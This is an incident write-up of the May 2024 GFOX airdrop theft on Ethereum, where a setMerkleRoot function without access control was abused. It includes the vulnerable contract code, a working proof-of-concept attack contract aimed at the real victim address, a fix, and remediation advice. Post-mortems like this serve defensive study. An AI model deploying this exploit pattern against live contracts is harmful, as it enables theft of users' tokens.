# GFOX — Missing Access Control on setMerkleRoot Airdrop Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | Galaxy Fox (GFOX) |
| **Chain** | Ethereum |
| **Loss** | ~330,000 GFOX tokens |
| **Attack Contract** | [0x86C68d9e](https://etherscan.io/address/0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5) |
| **Vulnerable Contract** | [0x47c4b314](https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686) |
| **GFOX Token** | [0x8F1CecE0](https://etherscan.io/address/0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662) |
| **Root Cause** | The `setMerkleRoot(bytes32)` function lacked access control, allowing the attacker to set an arbitrary Merkle root and call `claim()` with a valid proof against the manipulated root to drain all airdrop tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GFOX_exp.sol) |

---

## 1. Vulnerability Overview

Galaxy Fox's airdrop contract validates claims using a Merkle tree. The `setMerkleRoot()` function was exposed externally without access control, allowing the attacker to set an arbitrary Merkle root of their choosing. The attacker set a Merkle root by hashing `(attacker, largeAmount)`, then called `claim()` with an empty proof array (`[]`) to drain the entire airdrop pool.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: setMerkleRoot has no access control
contract GFOXAirdrop {
    bytes32 public merkleRoot;

    // No onlyOwner — anyone can change the Merkle root
    function setMerkleRoot(bytes32 _merkleRoot) external {
        merkleRoot = _merkleRoot;
    }

    function claim(address to, uint256 amount, bytes32[] calldata proof) external {
        // Verification uses the root set by the attacker
        bytes32 leaf = keccak256(abi.encodePacked(to, amount));
        require(MerkleProof.verify(proof, merkleRoot, leaf), "invalid proof");
        GFOX.transfer(to, amount);
    }
}

// ✅ Safe code: only the owner can set the Merkle root
function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {
    merkleRoot = _merkleRoot;
    emit MerkleRootUpdated(_merkleRoot);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: GFOX_decompiled.sol
contract GFOX {
    function claim(address p0, uint256 p1, bytes32[] memory p2) external {}  // ❌ Vulnerable
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Compute leaf using attacker address and desired amount
  │         └─ leaf = keccak256(abi.encodePacked(attacker, claimAmount))
  │
  ├─→ [2] Call setMerkleRoot(leaf)
  │         └─ No access control → merkleRoot = leaf
  │         └─ leaf as a single-node Merkle tree equals the root
  │
  ├─→ [3] Call claim(attacker, claimAmount, [])
  │         └─ Empty proof array passes because leaf == merkleRoot
  │
  └─→ [4] Drain ~330,000 GFOX airdrop tokens
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;
    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}

contract AttackContract {
    IVictim constant victim = IVictim(0x47c4b3144de2c87a458d510c0c0911d1903d1686);
    IERC20  constant GFOX   = IERC20(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662);

    function testExploit() external {
        uint256 claimAmount = GFOX.balanceOf(address(victim));

        // [1] Compute leaf using attacker address + full balance
        bytes32 leaf = keccak256(abi.encodePacked(address(this), claimAmount));

        // [2] Set computed leaf as Merkle root (no access control)
        victim.setMerkleRoot(leaf);

        // [3] Execute claim with empty proof (passes because leaf == root)
        victim.claim(address(this), claimAmount, new bytes32[](0));

        // Result: entire GFOX airdrop received
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control (Merkle root setter) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (setMerkleRoot + claim combination) |
| **DApp Category** | Merkle tree airdrop contract |
| **Impact** | Full airdrop token drain (~330K GFOX) |

## 6. Remediation Recommendations

1. **setMerkleRoot onlyOwner**: Restrict Merkle root changes to the owner only
2. **Root immutability**: Make the Merkle root immutable after the airdrop begins
3. **Claim cap**: Validate maximum claim amount per address
4. **Double-claim prevention**: Block duplicate claims using a `claimed[address]` mapping

## 7. Lessons Learned

- In Merkle tree airdrops, `setMerkleRoot()` is the most sensitive administrative function and must always require `onlyOwner`.
- The attacker exploited the mathematical property that an empty proof array (`[]`) passes a single-node Merkle tree (leaf == root).
- The same `setMerkleRoot` missing access control pattern as GFOX was a recurring vulnerability across multiple airdrop contracts in 2024.